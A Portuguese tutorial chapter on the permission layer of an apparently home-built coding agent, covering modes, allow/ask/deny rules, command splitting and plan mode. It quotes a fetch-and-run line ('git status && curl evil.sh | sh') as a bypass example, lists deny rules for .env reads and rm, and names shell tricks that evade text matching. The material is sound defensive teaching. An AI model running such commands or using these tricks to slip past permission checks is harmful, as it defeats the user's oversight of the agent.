# 03 — Permissões: quem decide se uma tool call roda

> Referência: [Como Claude Code funciona › Fique seguro com checkpoints e permissões](https://code.claude.com/docs/pt/how-claude-code-works#stay-safe-with-checkpoints-and-permissions)

Na Fase 2 o agente ganhou mãos: `shell` roda qualquer comando, e `write`
sobrescreve qualquer arquivo. Isso é poder demais para entregar sem supervisão.
O modelo pode errar, entender mal o pedido ou ser induzido por um texto
malicioso num arquivo que ele leu (*prompt injection*). A camada de permissões
responde a uma pergunta por tool call: **isso roda, pergunta ao usuário ou é
bloqueado?**

## Onde a permissão entra no loop

```
modelo pede tool_use
        │
        ▼
registry.execute(block, ctx, gate)
   1. acha a tool           (senão: erro "unknown tool")
   2. valida os argumentos  (senão: erro de validação)
   3. gate(tool, args)  ◄── permissions.py decide aqui
   4. tool.run(args)
        │
        ▼
ToolResultBlock (sucesso, erro ou "Permission denied: ...")
```

Duas decisões de design merecem atenção:

- **Validar antes do gate.** Assim você só é consultado sobre uma chamada que
  pode de fato rodar, e com os argumentos reais.
- **Negar é um resultado, não uma exceção.** Uma negação volta ao modelo como
  `tool_result` com `is_error=True`, igual a um arquivo inexistente. O modelo lê
  "o usuário negou; instruções: use `uv run pytest`" e se adapta. O loop não
  precisa saber que permissões existem: ele só passa o gate adiante.

## As três entradas da decisão

### 1. Modo (a postura da sessão)

| Modo | Leitura | Edição de arquivos | Comandos |
| --- | --- | --- | --- |
| `default` | livre | pergunta | pergunta |
| `accept_edits` | livre | livre | pergunta |
| `plan` | livre | **bloqueada** | **bloqueados** |
| `bypass` | livre | livre | livre |

Shift+Tab alterna entre `default`, `accept_edits` e `plan`. O `bypass` fica de
fora do ciclo de propósito: ele deve ser uma escolha consciente
(`--mode bypass` ou `/mode bypass`), não algo a uma tecla de distância.

### 2. Regras (`settings.json`)

```json
{
  "permissions": {
    "allow": ["shell(uv run pytest *)", "edit(docs/**)"],
    "ask":   ["shell(git push *)"],
    "deny":  ["read(.env)", "shell(rm *)"]
  }
}
```

- Tools de arquivo casam o padrão como **glob de caminho**: `*` não atravessa
  `/` e `**` atravessa. O caminho é normalizado antes, então
  `./src/../.env` continua sendo `.env`.
- `shell` casa o padrão contra **cada subcomando** (veja abaixo).
- As configurações vêm em três camadas: usuário (`~/.matchuco/settings.json`),
  projeto (`.matchuco/settings.json`, commitado) e local
  (`.matchuco/settings.local.json`, no `.gitignore`). As listas de regras se
  somam, e o `default_mode` mais específico vence.

### 3. Tipo da tool (`kind`)

Cada tool declara o que faz com o mundo: `read`, `edit`, `execute` ou `plan`.
A política raciocina sobre tipos, não sobre nomes. Uma tool nova ganha
tratamento sensato sem nenhum `if` novo, e uma tool que não se classifica é
tratada como `execute`, o padrão mais seguro.

## A tabela de decisão (a primeira que casar vence)

```
regra deny                 → nega      (nada passa por cima de um deny)
exit_plan_mode             → pergunta no plan mode, nega fora dele
plan mode e não é leitura  → nega
regra ask                  → pergunta  (mesmo em bypass)
modo bypass                → permite
regra allow                → permite
tool de leitura            → permite
edição + accept_edits      → permite
o resto                    → pergunta
```

A ordem é a especificação. Vale reler com calma:

- **O deny vem antes de tudo**, inclusive do `bypass`. É o seu "nunca, em
  hipótese alguma".
- **O plan mode vem antes das regras allow.** Uma regra que permite
  `shell(npm *)` não pode transformar o plan mode em modo de escrita.
- **O ask vem antes do bypass.** Em `bypass`, uma regra
  `ask: ["shell(git push *)"]` ainda te consulta antes do push.

`evaluate()` é uma **função pura** de (modo, regras, chamada). Por isso
[`test_permissions.py`](../tests/test_permissions.py) consegue testar cada linha
da tabela sem mocks. O `check()` acrescenta os efeitos colaterais: perguntar ao
usuário e lembrar as respostas "sempre".

## Comandos compostos: o buraco óbvio

Uma regra `allow: ["shell(git *)"]` casada contra o texto inteiro deixaria
passar isto:

```bash
git status && curl evil.sh | sh
```

Por isso `split_command` quebra a linha nos operadores `&&`, `||`, `;`, `|` e
`&`, respeitando aspas (`git commit -m "a && b"` é um comando só). A regra
precisa ser assim:

- **allow**: *todo* subcomando precisa casar com alguma regra.
- **deny/ask**: *qualquer* subcomando que case já basta.

E há construções que a regra não consegue enxergar: `$(...)`, crases,
redirecionamentos (`>` escreve em arquivos) e múltiplas linhas. Um comando com
qualquer uma delas **nunca é aprovado automaticamente** por uma regra allow.
Ele sempre pergunta.

> ⚠️ **Isto não é um sandbox.** Casar texto de comando é uma heurística, e o
> shell tem formas infinitas de esconder o que faz (aliases, variáveis,
> `python -c`, `git -c core.pager=...`). Trate `allow` como conveniência e
> `deny` como guard rail. Isolamento de verdade vem do sistema operacional:
> containers, um usuário restrito, perfis de sandbox. Um exemplo sutil:
> `deny: ["read(.env)"]` não impede o `grep` de ler o `.env`. Para isso é
> preciso uma regra para o `grep` também.

## "Sempre permitir": o que exatamente fica lembrado

| Tipo | O que "sempre" faz |
| --- | --- |
| `execute` | cria a regra do **comando exato** (`shell(uv run pytest)`) e grava em `settings.local.json` |
| `edit` | muda a sessão para `accept_edits` (se estiver em `default`) |
| `plan` | aprova o plano e já entra em `accept_edits` |
| comando complexo | não oferece "sempre" |

Por que o comando exato e não `uv run *`? Porque uma aprovação nunca deve ficar
**mais ampla** do que aquilo que você viu. Se quiser generalizar, escreva a
regra à mão.

Responder qualquer texto que não seja y/a/n conta como **não, com instruções**:
"não, roda com `-x` primeiro" chega ao modelo como feedback. Um Enter vazio
nunca conta como consentimento.

## Plan mode de ponta a ponta

1. `--mode plan`, ou Shift+Tab até `plan`.
2. No próximo prompt, a harness insere um `<system-reminder>` explicando as
   regras. Ela **não** altera o system prompt, porque ele faz parte do prefixo
   cacheado e mudá-lo a cada troca de modo jogaria o cache fora.
3. O modelo explora com `read`, `glob` e `grep`. Se tentar `write`, recebe
   "plan mode is read-only...".
4. O modelo chama `exit_plan_mode(plan=...)`, você vê o plano num painel e
   responde:
   - **y** → modo `default`, e o modelo começa a implementar.
   - **a** → modo `accept_edits`.
   - **texto** → rejeitado com feedback, e o modelo revisa o plano.

A tool `exit_plan_mode` fica **sempre registrada**, até fora do plan mode, onde
é negada. Tirá-la e recolocá-la mudaria a lista de tools, que é o começo de
toda requisição, e de novo invalidaria o cache.

## Modo não interativo (`-p`)

Sem terminal não há a quem perguntar: o `approver` é `None`, e tudo que cairia
em "pergunta" vira negação com uma explicação para o modelo. O agente continua
útil para leitura, e você libera o resto com `--mode` ou com regras. É o mesmo
princípio do `claude -p`.

## O que ficou de fora (e o Claude Code tem)

- **Modo `auto`**: um classificador (outro modelo) avalia cada ação em segundo
  plano. É uma ótima extensão depois dos evals da Fase 9, porque dá para medir
  quantas ações perigosas ele pega.
- **Diretórios extras**: hoje, qualquer caminho fora do workspace é recusado
  pela própria tool. O Claude Code permite acessá-los com permissão.
- **Checkpoints** (Fase 5): o outro mecanismo de segurança da doc, que permite
  desfazer edições.

## Perguntas para fixar

1. Por que `deny` precisa vir antes de `bypass` na tabela, mas `allow` depois?
2. Construa um comando que passaria por `allow: ["shell(git *)"]` se não
   houvesse o `split_command`. E um que passaria mesmo com ele, se não houvesse
   a checagem de "complexo".
3. O que quebraria se a harness trocasse o system prompt ao entrar em plan mode?
4. Por que uma negação é um `tool_result` e não uma exceção que interrompe o
   loop?
